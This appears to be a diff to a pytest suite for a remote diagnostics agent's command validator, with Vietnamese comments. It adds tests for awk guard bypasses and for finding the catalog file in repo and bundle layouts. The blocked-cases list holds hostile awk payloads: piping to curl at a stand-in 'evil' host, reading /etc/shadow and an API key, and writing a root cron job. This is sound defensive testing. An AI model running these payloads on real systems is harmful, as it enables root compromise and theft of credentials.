@@ -345,6 +345,11 @@ def test_awk_normal_scripts_run(script: str, files: list[str]) -> None:
     ('{print | "curl http://evil/x"}', "awk_pipe_to_command_blocked"),
     ('BEGIN{print ENVIRON["OMNI_AGENT_API_KEY"]}', "awk_environ_read_blocked"),
     ('BEGIN{while((getline l < "/etc/shadow")>0) print l}', "awk_getline_"),
+    # RCE quyền root 2026-07-31: đích redirect/getline là BIẾN, không có dấu nháy sát
+    # toán tử ⇒ guard cũ (đòi nháy) lọt hết. 3 PoC đã chạy thật vượt validate_command.
+    ('BEGIN{f="/etc/cron.d/pwn"; print "* * * * * root id" > f}', "awk_file_write_blocked"),
+    ('BEGIN{c="id"; c | getline out; print out}', "awk_getline_blocked"),
+    ('BEGIN{p="/etc/shadow"; getline l < p; print l}', "awk_getline_blocked"),
 ])
 def test_awk_only_writes_and_escapes_are_blocked(script: str, why: str) -> None:
     """Bốn cửa duy nhất awk tác động ra ngoài tiến trình của nó, cộng đọc env.
@@ -369,3 +374,87 @@ def test_awk_data_files_still_scope_checked() -> None:
         ok, reason = validate_command("awk", ["{print $1}", path])
         assert ok is False, path
         assert "hard_denied_path" in reason
+
+
+# ── Layout bundle trên host khách (hồi quy 2026-07-30) ───────────────────────
+
+
+class TestDefaultCatalogAcrossLayouts:
+    """Catalogue mặc định phải tìm được ở CẢ layout repo và layout bundle.
+
+    Bug thật: `_DEFAULT_CATALOG` từng là hằng `parents[3] / "config" / "...yaml"`.
+    Đúng trong repo (`src/pkg/diagnostics/`), nhưng bundle không có tầng `src/` nên
+    trên VM nó tính ra `/opt/config/diagnostic_commands.yaml` — không tồn tại. Hệ quả:
+    `load_catalog()` ném `CatalogError` ⇒ fail-closed ⇒ agent từ chối MỌI lệnh chẩn
+    đoán trên cả 3 VM. Và bundle chỉ mang bản `.json` (không có PyYAML trên host
+    khách), nên chỉ thử tên `.yaml` cũng không đủ.
+    """
+
+    def test_candidates_cover_repo_and_bundle_layout(self) -> None:
+        from pkg.diagnostics.command_catalog import _default_catalog_candidates
+
+        cands = _default_catalog_candidates()
+        suffixes = {c.suffix for c in cands}
+        assert suffixes == {".yaml", ".json"}, "phai thu ca YAML va JSON"
+
+        # Hai gốc khác nhau: một cho repo (có src/), một cho bundle (không có).
+        roots = {c.parent.parent for c in cands}
+        assert len(roots) == 2, f"phai co 2 goc, thay: {sorted(map(str, roots))}"
+
+    def test_repo_layout_resolves_to_real_file(self) -> None:
+        from pkg.diagnostics.command_catalog import _resolve_default_catalog
+
+        got = _resolve_default_catalog()
+        assert got is not None and got.exists()
+
+    def test_bundle_layout_with_json_only(self, tmp_path, monkeypatch) -> None:
+        """Dựng lại đúng layout bundle: pkg/diagnostics/ + config/*.json, KHÔNG có src/."""
+        import json
+
+        from pkg.diagnostics import command_catalog as cc
+
+        install = tmp_path / "opt" / "omni-remote-agent"
+        (install / "pkg" / "diagnostics").mkdir(parents=True)
+        (install / "config").mkdir()
+        fake_module = install / "pkg" / "diagnostics" / "command_catalog.py"
+        fake_module.write_text("# stand-in\n", encoding="utf-8")
+
+        entries = [{
+            "command": "uptime",
+            "domain": "os_host",
+            "description": "tai he thong",
+        }]
+        (install / "config" / "diagnostic_commands.json").write_text(
+            json.dumps({"commands": entries}), encoding="utf-8"
+        )
+
+        monkeypatch.setattr(cc, "__file__", str(fake_module))
+        cands = cc._default_catalog_candidates()
+        resolved = cc._resolve_default_catalog()
+
+        assert resolved is not None, (
+            f"khong resolve duoc trong layout bundle; da thu: {[str(c) for c in cands]}"
+        )
+        assert resolved.suffix == ".json"
+        assert resolved.parent.parent == install
+
+    def test_error_message_lists_every_candidate(self, tmp_path, monkeypatch) -> None:
+        """Không tìm thấy thì thông báo phải nói ĐÃ THỬ Ở ĐÂU.
+
+        Bản cũ chỉ in một đường dẫn, nên trên VM nó báo `/opt/config/...yaml` —
+        người đọc tưởng cấu hình sai chỗ đó, chứ không đoán được là giả định độ sâu
+        thư mục bị lệch.
+        """
+        from pkg.diagnostics.command_catalog import CatalogError
+        from pkg.diagnostics import command_catalog as cc
+
+        empty = tmp_path / "nowhere" / "pkg" / "diagnostics" / "command_catalog.py"
+        empty.parent.mkdir(parents=True)
+        empty.write_text("# stand-in\n", encoding="utf-8")
+        monkeypatch.setattr(cc, "__file__", str(empty))
+
+        with pytest.raises(CatalogError) as exc:
+            cc.load_catalog(env={})
+        msg = str(exc.value)
+        assert "da thu" in msg
+        assert msg.count("diagnostic_commands") >= 2
